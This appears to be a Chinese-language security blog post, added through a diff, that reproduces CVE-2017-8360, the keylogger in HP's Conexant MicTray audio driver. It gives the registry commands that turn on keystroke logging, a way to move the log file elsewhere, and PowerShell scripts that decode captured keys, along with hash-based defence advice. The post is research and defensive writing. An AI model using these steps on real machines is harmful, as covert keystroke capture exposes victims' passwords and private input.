@@ -1,0 +1,298 @@
+I"�+<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>2017年5月，瑞士安全公司Modzero的安全研究员Thorsten Schroeder发现HP的Conexant音频驱动中存在Keylogger，非法记录用户的键盘输入。
+本文仅在技术研究的角度，测试和分析利用方法，给出防御建议，纠正部分文章中出现的错误理解。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>漏洞简要介绍</li>
+  <li>漏洞复现</li>
+  <li>利用思路</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-漏洞简要介绍">0x02 漏洞简要介绍</h2>
+<hr />
+
+<p>可供参考的资料：</p>
+
+<p>https://www.modzero.ch/advisories/MZ-17-01-Conexant-Keylogger.txt</p>
+
+<p>用户在安装HP的Conexant音频驱动后，将会创建计划任务，在用户登录后执行文件MicTray.exe</p>
+
+<p><strong>注：</strong></p>
+
+<p>32位程序为MicTray.exe，64位程序为MicTray64.exe</p>
+
+<p>启动MicTray.exe会记录用户的键盘输入，以两种方式保存：</p>
+
+<ul>
+  <li>写入文件<code class="language-plaintext highlighter-rouge">C:\Users\Public\MicTray.log</code></li>
+  <li>通过WinAPI OutputDebugString()记录内容，可被其他程序读取</li>
+</ul>
+
+<h2 id="0x03-漏洞复现">0x03 漏洞复现</h2>
+<hr />
+
+<p>关于漏洞复现的参考资料：</p>
+
+<p>https://diablohorn.com/2017/05/12/repurposing-the-hp-audio-key-logger/</p>
+
+<p>本节会对参考资料中的内容做扩展，介绍读取OutputDebugString()中记录的方法</p>
+
+<p>存在漏洞的驱动下载地址：</p>
+
+<p>ftp://whp-aus1.cold.extweb.hp.com/pub/softpaq/sp79001-79500/sp79420.html</p>
+
+<p>该地址已经失效，单个文件的下载地址：</p>
+
+<p>MicTray.exe：</p>
+
+<p>https://www.virustotal.com/nl/file/e882149c43976dfadb2746eb2d75a73f0be5aa193623b18b50827f43cce3ed84/analysis/</p>
+
+<p>MicTray64.exe：</p>
+
+<p>https://www.virustotal.com/nl/file/c046c7f364b42388bb392874129da555d9c688dced3ac1d6a1c6b01df29ea7a8/analysis/</p>
+
+<p>测试系统： Win7 x64(更新补丁)</p>
+
+<h3 id="记录方法1将键盘记录内容写入文件cuserspublicmictraylog">记录方法1.将键盘记录内容写入文件<code class="language-plaintext highlighter-rouge">C:\Users\Public\MicTray.log</code></h3>
+
+<h4 id="1添加注册表">(1)添加注册表</h4>
+
+<p>使用MicTray.exe：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Wow6432Node\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
+</code></pre></div></div>
+
+<p>使用MicTray64.exe：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
+</code></pre></div></div>
+
+<p>二选一即可</p>
+
+<p>本次测试选择MicTray64.exe</p>
+
+<h4 id="2运行mictrayexemictray64exe">(2)运行MicTray.exe/MicTray64.exe</h4>
+
+<p>生成记录文件文件<code class="language-plaintext highlighter-rouge">C:\Users\Public\MicTray.log</code></p>
+
+<p>记录键盘输入内容，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/2-1.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>低权限运行即可，想要记录高权限程序中的键盘输入，需要高权限运行</p>
+
+<h3 id="记录方法2通过outputdebugstring输出键盘记录内容">记录方法2.通过OutputDebugString()输出键盘记录内容</h3>
+
+<p>可以通过DbgView读取WinAPI OutputDebugString()的输出内容</p>
+
+<p>下载地址：</p>
+
+<p>https://live.sysinternals.com/Dbgview.exe</p>
+
+<p>由于无法获得HP Conexant音频驱动的安装包，这里选择使用Procmon寻找触发方式</p>
+
+<p><strong>注：</strong></p>
+
+<p>也可以对其动态调试，找到函数判断条件</p>
+
+<p>使用Procmon监控MicTray64.exe在运行时对注册表的操作，记录方法1（写入文件）的注册表操作如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/2-2.png" alt="Alt text" /></p>
+
+<p>DbgView输出如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/2-3.png" alt="Alt text" /></p>
+
+<p>尝试解决错误，添加注册表项：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v HotKeyMicScancode /t REG_DWORD /d 1
+reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v HotKeySpkScancode /t REG_DWORD /d 1
+reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v PlaybackGPIO /t REG_DWORD /d 1
+reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CaptureGPIO /t REG_DWORD /d 1
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>MicTray64.exe运行后会自动在注册表<code class="language-plaintext highlighter-rouge">hkcu\SOFTWARE\Conexant</code>添加配置信息</p>
+
+<p>经测试，还需要清除注册表中的配置信息，否则DbgView无法获得键盘记录</p>
+
+<p>清除配置信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg delete hkcu\SOFTWARE\Conexant /f 
+</code></pre></div></div>
+
+<p>重新启动MicTray64.exe，成功获得键盘记录消息，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/2-4.png" alt="Alt text" /></p>
+
+<p>综上，记录方法2（通过OutputDebugString()输出）的触发条件如下：</p>
+
+<ul>
+  <li>不存在注册表项hkcu\SOFTWARE\Conexant</li>
+  <li>配置以下注册表项：
+  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
+  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v HotKeyMicScancode /t REG_DWORD /d 1
+  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v HotKeySpkScancode /t REG_DWORD /d 1
+  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v PlaybackGPIO /t REG_DWORD /d 1
+  reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CaptureGPIO /t REG_DWORD /d 1</li>
+</ul>
+
+<h2 id="0x04-利用思路">0x04 利用思路</h2>
+<hr />
+
+<p>站在渗透测试的角度，分析可供利用的思路</p>
+
+<p>通过修改注册表可以修改记录文件的保存位置：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Conexant\MicTray64.exe /v LogName /t REG_SZ /d "C:\test\log.txt"
+</code></pre></div></div>
+
+<h3 id="1针对32位系统的键盘记录">1、针对32位系统的键盘记录</h3>
+
+<p>配置命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Conexant\MicTray.exe /v LogName /t REG_SZ /d "C:\test\log.txt"
+reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
+</code></pre></div></div>
+
+<p>执行MicTray.exe后，记录文件保存在<code class="language-plaintext highlighter-rouge">C:\test\log.txt</code></p>
+
+<h3 id="2针对64位系统的键盘记录">2、针对64位系统的键盘记录</h3>
+
+<p>32位程序(MicTray.exe)的配置命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Conexant\MicTray.exe /v LogName /t REG_SZ /d "C:\test\log.txt"
+reg add hklm\SOFTWARE\Wow6432Node\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
+</code></pre></div></div>
+
+<p>64位程序(MicTray64.exe)的配置命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\SOFTWARE\Conexant\MicTray64.exe /v LogName /t REG_SZ /d "C:\test\log.txt"
+reg add hklm\SOFTWARE\Conexant\MicTray\Hotkey /v CustomSettings /t REG_DWORD /d 1
+</code></pre></div></div>
+
+<p>该工具通过调用WinAPI SetwindowsHookEx()实现键盘记录，相对于常规的键盘记录程序，优点在于包含数字签名</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/3-1.png" alt="Alt text" /></p>
+
+<h3 id="3解析键盘记录内容">3、解析键盘记录内容</h3>
+
+<p>日志文件记录的是键盘的虚拟键码</p>
+
+<p>可以通过脚本实现将虚拟键码转换为键盘按键的名称</p>
+
+<p>测试参考链接中的powershell代码：</p>
+
+<p>https://www.modzero.ch/advisories/MZ-17-01-Conexant-Keylogger.txt</p>
+
+<p>代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filename = "c:\users\public\MicTray.log"
+
+[System.IO.FileStream]   $fs = [System.IO.File]::Open(
+      $filename, 
+      [System.IO.FileMode]::Open, 
+      [System.IO.FileAccess]::Read, 
+      [System.IO.FileShare]::ReadWrite)
+         
+[System.IO.StreamReader] $fr = [System.IO.StreamReader]::new(
+      $fs, 
+      [Text.UTF8Encoding]::UNICODE)
+
+$el = 0
+
+while($el -lt 2) {
+   
+   $line = $fr.ReadLine()
+
+   # handle broken newlines in log...
+   if([string]::IsNullOrEmpty($line)) {
+      $el++
+   } else {
+      $el=0
+   }
+
+   $mc = [regex]::Match($line, 
+         "MicTray64.exe.*flags (0x0[A-Fa-f0-9]?).*vk (0x[A-Fa-f0-9]+)$")
+   $r = $mc.Groups[2].Value
+
+   if(-Not [string]::IsNullOrEmpty($r)) {
+      $i = [convert]::ToInt32($r, 16)
+      $c = [convert]::ToChar($i)
+      
+      if($i -lt 0x20 -or $i -gt 0x7E) { $c = '.' }
+         
+      write-host -NoNewLine $("{0}" -f $c)
+   }
+}
+</code></pre></div></div>
+
+<p>我在测试时代码报错，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/3-2.png" alt="Alt text" /></p>
+
+<p>这里提供一个简单的解决方法，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filename = "c:\users\public\MicTray.log"
+$fr = Get-Content $filename
+foreach ($line in $fr)
+{
+   $mc = [regex]::Match($line, 
+         "MicTray64.exe.*flags (0x0[A-Fa-f0-9]?).*vk (0x[A-Fa-f0-9]+)$")
+   $r = $mc.Groups[2].Value
+
+   if(-Not [string]::IsNullOrEmpty($r)) {
+      $i = [convert]::ToInt32($r, 16)
+      $c = [convert]::ToChar($i)
+      
+      if($i -lt 0x20 -or $i -gt 0x7E) { $c = '.' }
+         
+      write-host -NoNewLine $("{0}" -f $c)
+   }
+}
+</code></pre></div></div>
+
+<p>转换后的输出如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-1/3-3.png" alt="Alt text" /></p>
+
+<h2 id="0x05-防御建议">0x05 防御建议</h2>
+<hr />
+
+<p>添加文件黑名单</p>
+
+<p>MicTray.exe：</p>
+
+<p>SHA256:	<code class="language-plaintext highlighter-rouge">e882149c43976dfadb2746eb2d75a73f0be5aa193623b18b50827f43cce3ed84</code></p>
+
+<p>MicTray64.exe:</p>
+
+<p>SHA256:	<code class="language-plaintext highlighter-rouge">c046c7f364b42388bb392874129da555d9c688dced3ac1d6a1c6b01df29ea7a8</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>更新Windows补丁并不能阻止该程序的运行</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文复现了CVE-2017-8360(Keylogger in HP Audio Driver)键盘记录的方法，分析利用思路，改进测试脚本，给出防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
